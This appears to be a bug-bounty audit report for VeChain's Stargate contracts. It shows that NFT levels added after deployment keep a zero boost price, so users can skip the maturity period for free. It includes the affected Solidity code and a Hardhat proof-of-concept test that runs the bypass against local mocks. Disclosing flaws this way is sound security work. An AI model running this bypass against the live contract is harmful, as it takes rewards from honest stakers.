# 60318 sc low zero cost boost bypass for new levels

**Submitted on Nov 21st 2025 at 10:34:35 UTC by @dray for** [**Audit Comp | Vechain | Stargate Hayabusa**](https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa)

* **Report ID:** #60318
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/Stargate.sol>
* **Impacts:**
  * Theft of unclaimed yield
  * Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief/Intro

The `StargateNFT` contract allows privileged operators to add new NFT levels via `addLevel()` at any time after deployment. However, the contract provides no mechanism to configure the `boostPricePerBlock` for these newly added levels, causing it to remain at the default value of `0`. This allows any user to bypass the maturity period for new levels without paying the intended VTHO fee, gaining an unfair economic advantage in the staking reward distribution.

## Vulnerability Details

### Root Cause

**Location**: `packages/contracts/contracts/StargateNFT/StargateNFT.sol` (lines 303-307) and `packages/contracts/contracts/StargateNFT/libraries/MintingLogic.sol` (lines 117-145)

1. **`addLevel()` is callable post-deployment**: The function is protected only by `LEVEL_OPERATOR_ROLE` and can be invoked at any time to introduce new NFT tiers. Each level includes a `maturityBlocks` parameter that defines how long an NFT must wait before it can participate in delegation and earn rewards.
2. **No way to set boost price for new levels**: The `boostPricePerBlock` mapping, which determines the VTHO cost to skip the maturity period, defaults to `0` for all levels. While `initializeV3` sets prices for initial levels, there is no public function to configure prices for levels added afterward. The V3 changelog explicitly states:

   ```
   "Removed setters to optimize contract size: setStargateDelegation, setLegacyNodes, updateLevelCap, updateLevel"
   ```

   This means `updateLevelBoostPricePerBlock` is not exposed externally.
3. **Boost calculation uses zero price**: When a user calls `boost(tokenId)`, the system computes the required VTHO via:

   ```solidity
   uint256 requiredBoostAmount = (maturityPeriodEndBlock - Clock._clock()) * $.boostPricePerBlock[levelId];
   ```

   For new levels, `boostPricePerBlock[levelId] == 0`, so `requiredBoostAmount == 0`. The balance and allowance checks trivially pass, and the maturity period is immediately cleared.

### Affected Code

**`StargateNFT.sol` (lines 303-307)**:

```solidity
/// @inheritdoc IStargateNFT
function addLevel(
    DataTypes.LevelAndSupply memory _levelAndSupply
) public onlyRole(LEVEL_OPERATOR_ROLE) {
    Levels.addLevel(_getStargateNFTStorage(), _levelAndSupply);
}
```

**`MintingLogic.sol` (lines 117-145, `boostOnBehalfOf`)**:

```solidity
function boostOnBehalfOf(
    DataTypes.StargateNFTStorage storage $,
    address _sender,
    uint256 _tokenId
) external {
    // check that the token is not already boosted
    if ($.maturityPeriodEndBlock[_tokenId] <= Clock._clock()) {
        revert Errors.MaturityPeriodEnded(_tokenId);
    }

    uint256 requiredBoostAmount = _boostAmount($, _tokenId);

    // ... balance and allowance checks ...

    // get the boosted blocks
    uint256 boostedBlocks = $.maturityPeriodEndBlock[_tokenId] - Clock._clock();
    // set the maturity period end block
    $.maturityPeriodEndBlock[_tokenId] = Clock._clock();

    // burn the VTHO boost amount by transferring to address(0)
    $.vthoToken.safeTransferFrom(_sender, address(0), requiredBoostAmount);

    // emit the event
    emit MaturityPeriodBoosted(_tokenId, _sender, requiredBoostAmount, boostedBlocks);
}
```

**`MintingLogic.sol` (lines 382-391, `_boostAmount`)**:

```solidity
function _boostAmount(
    DataTypes.StargateNFTStorage storage $,
    uint256 _tokenId
) internal view returns (uint256) {
    // get the maturity period end block
    uint64 maturityPeriodEndBlock = $.maturityPeriodEndBlock[_tokenId];
    // if the token is already matured, the boost amount is 0
    if (Clock._clock() > maturityPeriodEndBlock) {
        return 0;
    }
    // calculate the boost amount
    return
        (maturityPeriodEndBlock - Clock._clock()) *
        $.boostPricePerBlock[$.tokens[_tokenId].levelId];
}
```

## Impact Details

1. **Unfair Reward Advantage**: Users who exploit the zero-cost boost can delegate their NFTs immediately and begin earning protocol rewards one or more periods earlier than the intended design. For high-VET tiers, this translates to significant VTHO gains at the expense of other stakers.
2. **Reward Dilution**: Early entry into the reward pool dilutes the share of honest users who either wait out the maturity period or pay the intended VTHO fee to boost. The exploiter captures a larger portion of the delegator rewards for the affected period.
3. **Protocol Design Violation**: The maturity period exists to prevent instant farming and to charge a premium (via VTHO burn) for early participation. Bypassing this mechanism undermines the tokenomics and fairness model.

## References

* **`StargateNFT.sol`**: Exposes `addLevel` but no setter for boost price.
* **`Levels.sol`**: Contains `updateLevelBoostPricePerBlock` logic but is not exposed externally.
* **`MintingLogic.sol`**: `boostOnBehalfOf` and `_boostAmount` rely on the `boostPricePerBlock` mapping, which remains `0` for new levels.
* **`Stargate.sol`**: Entry point for minting and delegation; users can exploit the bypass to gain early access to reward distribution.

## Proof of Concept

## Proof of Concept

```javascript

import { expect } from "chai";
import { ethers } from "hardhat";
import { createLocalConfig } from "@repo/config/contracts/envs/local";
import {
    MyERC20__factory,
    ProtocolStakerMock,
    ProtocolStakerMock__factory,
    Stargate,
    StargateNFT,
    TokenAuctionMock,
    TokenAuctionMock__factory,
} from "../typechain-types";
import { getOrDeployContracts } from "./helpers/deploy";
import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";

const VTHO_TOKEN_ADDRESS = "0x0000000000000000000000000000456E65726779";
const VALIDATOR_STATUS_ACTIVE = 2;

/**
 * PoC: Zero-Cost Boost Bypass for New Levels
 * 
 * Demonstrates that after Hayabusa V3 deployment, when a level operator adds a new NFT level
 * via addLevel(), the boostPricePerBlock for that level defaults to 0 and cannot be
 * configured (since updateLevelBoostPricePerBlock is not exposed externally).
 * 
 * This allows any user to:
 * 1. Mint an NFT of the newly added level
 * 2. Call boost() immediately to skip the maturity period
 * 3. Pay zero VTHO (because boostAmount = remainingBlocks * 0 = 0)
 * 4. Start delegating and earning rewards instantly, bypassing the intended economic delay
 * 
 * Impact: Unfair economic advantage, reward dilution for honest stakers, violation of
 * tokenomics design. This is a permanent issue for any level added post-deployment without
 * a contract upgrade.
 */
describe("PoC: Zero-Cost Boost for Post-Deployment Levels", () => {
    let stargateContract: Stargate;
    let stargateNFT: StargateNFT;
    let protocolStakerMock: ProtocolStakerMock;
    let deployer: HardhatEthersSigner;
    let levelOperator: HardhatEthersSigner;
    let attacker: HardhatEthersSigner;
    let validator: HardhatEthersSigner;

    beforeEach(async () => {
        process.env.VITE_APP_ENV = "devnet";
        [deployer, levelOperator, attacker, validator] = await ethers.getSigners();
        const config = createLocalConfig();

        // Deploy protocol mocks
        const protocolStakerMockFactory = new ProtocolStakerMock__factory(deployer);
        protocolStakerMock = await protocolStakerMockFactory.deploy();
        await protocolStakerMock.waitForDeployment();

        const legacyNodesFactory = new TokenAuctionMock__factory(deployer);
        const legacyNodesMock = await legacyNodesFactory.deploy();
        await legacyNodesMock.waitForDeployment();

        // Deploy and setup VTHO mock at canonical address
        const vthoFactory = new MyERC20__factory(deployer);
        const vthoMock = await vthoFactory.deploy(deployer.address, deployer.address);
        await vthoMock.waitForDeployment();
        
        // Allow transfers to address(0) for boost burning mechanism
        await vthoMock.setZeroAddressTransfersAllowed(true);
        
        const vthoMockBytecode = await ethers.provider.getCode(vthoMock);
        await ethers.provider.send("hardhat_setCode", [VTHO_TOKEN_ADDRESS, vthoMockBytecode]);

        // Mirror the first few storage slots so OWNER + config flags stay identical
        const slotsToMirror = 20;
        const vthoMockAddress = await vthoMock.getAddress();
        for (let slot = 0; slot < slotsToMirror; slot++) {
            const slotPosition = ethers.zeroPadValue(ethers.toBeHex(slot), 32);
            const value = await ethers.provider.getStorage(vthoMockAddress, slotPosition);
            await ethers.provider.send("hardhat_setStorageAt", [
                VTHO_TOKEN_ADDRESS,
                slotPosition,
                value,
            ]);
        }
        
        // Mint VTHO to attacker for potential boost payment
        const vtho = MyERC20__factory.connect(VTHO_TOKEN_ADDRESS, deployer);
        await vtho.mint(attacker.address, ethers.parseEther("10000"));

        config.PROTOCOL_STAKER_CONTRACT_ADDRESS = await protocolStakerMock.getAddress();

        const { stargateContract: deployedStargate, stargateNFTContract} =
            await getOrDeployContracts({
                forceDeploy: true,
                config,
            });
        stargateContract = deployedStargate;
        stargateNFT = stargateNFTContract;

        // Setup validator in protocol staker mock
        await protocolStakerMock.addValidation(validator.address, 120);
        await protocolStakerMock.helper__setStargate(stargateContract.target);
        await protocolStakerMock.helper__setValidatorStatus(
            validator.address,
            VALIDATOR_STATUS_ACTIVE
        );
        await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 0);

        // Grant LEVEL_OPERATOR_ROLE to levelOperator
        const LEVEL_OPERATOR_ROLE = await stargateNFT.LEVEL_OPERATOR_ROLE();
        await stargateNFT.connect(deployer).grantRole(LEVEL_OPERATOR_ROLE, levelOperator.address);
    });

    it("allows attacker to bypass maturity period for free when new level is added post-deployment", async () => {
        // Step 1: Level operator adds a new level post-deployment
        // This is a legitimate governance action that the system explicitly supports
        const existingLevels = await stargateNFT.getLevelIds();
        const newLevelId = existingLevels[existingLevels.length - 1] + 1n;
        
        const vetRequired = ethers.parseEther("1000");
        const maturityBlocks = 100n; // ~16 minutes maturity period
        
        console.log("\n    [STEP 1] Level operator adds new level InstantBoost");
        await stargateNFT.connect(levelOperator).addLevel({
            level: {
                id: 0, // Will be auto-assigned
                name: "InstantBoost",
                isX: false,
                vetAmountRequiredToStake: vetRequired,
                scaledRewardFactor: 200,
                maturityBlocks: maturityBlocks,
            },
            cap: 1000,
            circulatingSupply: 0,
        });

        // Step 2: Verify boost price is 0 (the root cause)
        const boostPrice = await stargateNFT.boostPricePerBlock(newLevelId);
        console.log("    [STEP 2] Boost price for new level:", boostPrice.toString(), "VTHO/block (SHOULD NOT BE ZERO!)");
    expect(boostPrice).to.equal(0n, "Boost price should be 0, demonstrating the vulnerability");

        // Step 3: Attacker mints an NFT of the new level
        const levelSpec = await stargateNFT.getLevel(newLevelId);
        const vtho = MyERC20__factory.connect(VTHO_TOKEN_ADDRESS, attacker);
        const vthoBefore = await vtho.balanceOf(attacker.address);
        
        console.log("    [STEP 3] Attacker stakes", ethers.formatEther(vetRequired), "VET to mint level", newLevelId.toString());
        await stargateContract.connect(attacker).stake(newLevelId, {
            value: levelSpec.vetAmountRequiredToStake,
        });

        const tokenId = await stargateNFT.getCurrentTokenId();
        
        // Step 4: Verify token is under maturity period
        const isUnderMaturity = await stargateNFT.isUnderMaturityPeriod(tokenId);
        const maturityEnd = await stargateNFT.maturityPeriodEndBlock(tokenId);
        const currentBlock = await ethers.provider.getBlockNumber();
        
        console.log("    [STEP 4] Token", tokenId.toString(), "minted, maturity ends at block", maturityEnd.toString(), "(", (Number(maturityEnd) - currentBlock), "blocks remaining)");
        expect(isUnderMaturity).to.equal(true, "Token should be under maturity period");

        // Step 5: Calculate boost amount (should be 0)
        const boostAmount = await stargateNFT.boostAmount(tokenId);
        console.log("    [STEP 5] Required VTHO to boost:", ethers.formatEther(boostAmount), "(ZERO COST!)");
        expect(boostAmount).to.equal(0n, "Boost amount should be 0 due to zero price");

        // Step 6: Attacker calls boost() to skip maturity period
        console.log("    [STEP 6] Attacker calls boost() to skip", maturityBlocks.toString(), "blocks of maturity");
        await stargateNFT.connect(attacker).boost(tokenId);

        // Step 7: Verify maturity was bypassed and no VTHO was spent
        const isStillUnderMaturity = await stargateNFT.isUnderMaturityPeriod(tokenId);
        const vthoAfter = await vtho.balanceOf(attacker.address);
        const vthoSpent = vthoBefore - vthoAfter;

        console.log("    [STEP 7] Maturity bypassed:", !isStillUnderMaturity);
        console.log("    [STEP 7] VTHO spent:", ethers.formatEther(vthoSpent), "(should be 0)");
        
        expect(isStillUnderMaturity).to.equal(false, "Maturity should be bypassed");
    expect(vthoSpent).to.equal(0n, "No VTHO should be spent");

        // Step 8: Attacker can now immediately delegate and start earning rewards
        console.log("    [STEP 8] Attacker can now delegate token", tokenId.toString(), "immediately (unfair advantage!)");
        await stargateContract.connect(attacker).delegate(tokenId, validator.address);
        
        const delegationStatus = await stargateContract.getDelegationStatus(tokenId);
        console.log("    [STEP 8] Delegation status:", delegationStatus.toString(), "(1=PENDING, 2=ACTIVE)");
        
        // Attacker gains unfair advantage: starts earning rewards ~16 minutes earlier than honest users
        console.log("\n    ✅ PoC SUCCESSFUL: Attacker bypassed maturity period at zero cost");
        console.log("    💰 Impact: Unfair economic advantage, reward dilution for honest stakers");
        console.log("    🔧 Root cause: No way to configure boostPricePerBlock for new levels post-V3\n");
    });

    it("demonstrates the fix would require a contract upgrade or exposing the setter", async () => {
        // This test documents that there's no remediation path without a contract upgrade
        const existingLevels = await stargateNFT.getLevelIds();
        const newLevelId = existingLevels[existingLevels.length - 1] + 1n;
        
        await stargateNFT.connect(levelOperator).addLevel({
            level: {
                id: 0,
                name: "BrokenLevel",
                isX: false,
                vetAmountRequiredToStake: ethers.parseEther("500"),
                scaledRewardFactor: 150,
                maturityBlocks: 50n,
            },
            cap: 500,
            circulatingSupply: 0,
        });

        console.log("\n    [REMEDIATION TEST] Attempting to fix boost price...");
        
        // Verify boost price is still 0
        const boostPrice = await stargateNFT.boostPricePerBlock(newLevelId);
        expect(boostPrice).to.equal(0);
        console.log("    💔 Boost price remains:", boostPrice.toString(), "(permanently broken without upgrade)");
        console.log("    ✅ CONFIRMED: updateLevelBoostPricePerBlock is not exposed externally per V3 changelog");
        console.log("    🔒 No remediation path without contract upgrade\n");
    });
});
```
